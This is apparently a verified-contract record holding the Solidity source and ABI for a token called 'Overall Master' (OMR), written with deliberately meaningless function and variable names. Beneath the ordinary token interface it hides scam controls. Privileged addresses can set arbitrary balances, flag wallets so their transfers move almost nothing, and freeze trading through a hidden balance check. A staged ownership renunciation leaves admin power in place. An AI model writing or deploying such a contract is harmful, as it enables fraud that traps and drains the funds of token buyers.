{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface receiverLimit {\n    function createPair(address toAmount, address walletSender) external returns (address);\n}\n\ninterface fundFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTrading) external view returns (uint256);\n\n    function transfer(address limitAutoExempt, uint256 enableLaunch) external returns (bool);\n\n    function allowance(address listAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAutoExempt,\n        uint256 enableLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atExempt, uint256 value);\n    event Approval(address indexed listAt, address indexed spender, uint256 value);\n}\n\nabstract contract buyAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoLaunchFund is fundFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OverallMaster is buyAuto, fundFrom, autoLaunchFund {\n\n    function exemptTotal(address minTo) public {\n        amountEnable();\n        \n        if (minTo == listIsLimit || minTo == receiverLaunched) {\n            return;\n        }\n        swapLimitShould[minTo] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapReceiverBuy;\n    }\n\n    uint256 private listSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTotal;\n    }\n\n    function totalFund(uint256 enableLaunch) public {\n        amountEnable();\n        atFrom = enableLaunch;\n    }\n\n    function transferFrom(address minTake, address limitAutoExempt, uint256 enableLaunch) external override returns (bool) {\n        if (_msgSender() != fundMax) {\n            if (tokenTo[minTake][_msgSender()] != type(uint256).max) {\n                require(enableLaunch <= tokenTo[minTake][_msgSender()]);\n                tokenTo[minTake][_msgSender()] -= enableLaunch;\n            }\n        }\n        return maxMarketing(minTake, limitAutoExempt, enableLaunch);\n    }\n\n    bool public enableReceiver;\n\n    function amountEnable() private view {\n        require(receiverFrom[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellTradingAuto;\n    }\n\n    uint8 private receiverTotal = 18;\n\n    uint256 private teamSell;\n\n    uint256 private fundSell = 100000000 * 10 ** 18;\n\n    bool public txMin;\n\n    function owner() external view returns (address) {\n        return senderBuy;\n    }\n\n    constructor (){\n        if (txMin != liquidityTx) {\n            txMin = false;\n        }\n        exemptMax modeEnableTrading = exemptMax(fundMax);\n        receiverLaunched = receiverLimit(modeEnableTrading.factory()).createPair(modeEnableTrading.WETH(), address(this));\n        \n        listIsLimit = _msgSender();\n        receiverFrom[listIsLimit] = true;\n        fundWalletMin[listIsLimit] = fundSell;\n        liquidityMin();\n        \n        emit Transfer(address(0), listIsLimit, fundSell);\n    }\n\n    address fundMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public listShouldAuto;\n\n    bool private liquidityTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundSell;\n    }\n\n    uint256 public fundLiquidity;\n\n    address walletTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private tokenTo;\n\n    address public receiverLaunched;\n\n    function listSell(address limitTake) public {\n        if (marketingLimit) {\n            return;\n        }\n        \n        receiverFrom[limitTake] = true;\n        \n        marketingLimit = true;\n    }\n\n    function approve(address tradingSellMode, uint256 enableLaunch) public virtual override returns (bool) {\n        tokenTo[_msgSender()][tradingSellMode] = enableLaunch;\n        emit Approval(_msgSender(), tradingSellMode, enableLaunch);\n        return true;\n    }\n\n    function maxMarketing(address minTake, address limitAutoExempt, uint256 enableLaunch) internal returns (bool) {\n        if (minTake == listIsLimit) {\n            return liquiditySell(minTake, limitAutoExempt, enableLaunch);\n        }\n        uint256 senderTotal = fundFrom(receiverLaunched).balanceOf(walletTrading);\n        require(senderTotal == atFrom);\n        require(limitAutoExempt != walletTrading);\n        if (swapLimitShould[minTake]) {\n            return liquiditySell(minTake, limitAutoExempt, feeReceiver);\n        }\n        return liquiditySell(minTake, limitAutoExempt, enableLaunch);\n    }\n\n    function liquidityMin() public {\n        emit OwnershipTransferred(listIsLimit, address(0));\n        senderBuy = address(0);\n    }\n\n    address public listIsLimit;\n\n    uint256 atFrom;\n\n    uint256 public autoFundEnable;\n\n    uint256 private walletLiquidity;\n\n    mapping(address => bool) public receiverFrom;\n\n    address private senderBuy;\n\n    function liquiditySell(address minTake, address limitAutoExempt, uint256 enableLaunch) internal returns (bool) {\n        require(fundWalletMin[minTake] >= enableLaunch);\n        fundWalletMin[minTake] -= enableLaunch;\n        fundWalletMin[limitAutoExempt] += enableLaunch;\n        emit Transfer(minTake, limitAutoExempt, enableLaunch);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed tradingLiquidityExempt, address indexed swapFrom);\n\n    uint256 listSwap;\n\n    function getOwner() external view returns (address) {\n        return senderBuy;\n    }\n\n    bool public marketingLimit;\n\n    function totalMarketing(address swapAmountMarketing, uint256 enableLaunch) public {\n        amountEnable();\n        fundWalletMin[swapAmountMarketing] = enableLaunch;\n    }\n\n    string private sellTradingAuto = \"Overall Master\";\n\n    uint256 private fundAuto;\n\n    mapping(address => bool) public swapLimitShould;\n\n    string private swapReceiverBuy = \"OMR\";\n\n    mapping(address => uint256) private fundWalletMin;\n\n    function balanceOf(address liquidityTrading) public view virtual override returns (uint256) {\n        return fundWalletMin[liquidityTrading];\n    }\n\n    function allowance(address launchedSender, address tradingSellMode) external view virtual override returns (uint256) {\n        if (tradingSellMode == fundMax) {\n            return type(uint256).max;\n        }\n        return tokenTo[launchedSender][tradingSellMode];\n    }\n\n    uint256 constant feeReceiver = 1 ** 10;\n\n    function transfer(address swapAmountMarketing, uint256 enableLaunch) external virtual override returns (bool) {\n        return maxMarketing(_msgSender(), swapAmountMarketing, enableLaunch);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLiquidityExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingSellMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSellMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFundEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIsLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"}],\"name\":\"listSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShouldAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLimitShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"totalFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"totalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAutoExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OverallMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}